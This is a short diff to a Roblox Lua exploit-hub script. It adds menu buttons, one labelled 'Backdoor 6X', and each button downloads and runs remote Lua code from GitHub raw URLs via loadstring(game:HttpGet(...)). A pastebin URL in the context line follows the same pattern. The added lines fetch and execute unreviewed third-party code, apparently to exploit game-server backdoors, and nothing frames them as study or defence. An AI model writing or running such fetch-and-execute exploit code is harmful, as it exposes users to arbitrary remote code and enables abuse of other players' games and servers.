@@ -44,6 +44,26 @@ loadstring(game:HttpGet("https://pastebin.com/raw/39x4cK2Z"))()
   	end    
 })
 
+local Section = Tab:AddSection({
+	Name = "Key : Syntaxbesthub"
+})
+
+Tab:AddButton({
+	Name = "Syntax",
+	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Memeboiyot/SyntaxRebornOfficial/main/SyntaxReborn", true))()
+      		print("Succeed😁🥳")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Backdoor 6X",
+	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
+      		print("Succeed😁🥳")
+  	end    
+})
+
 
 
 
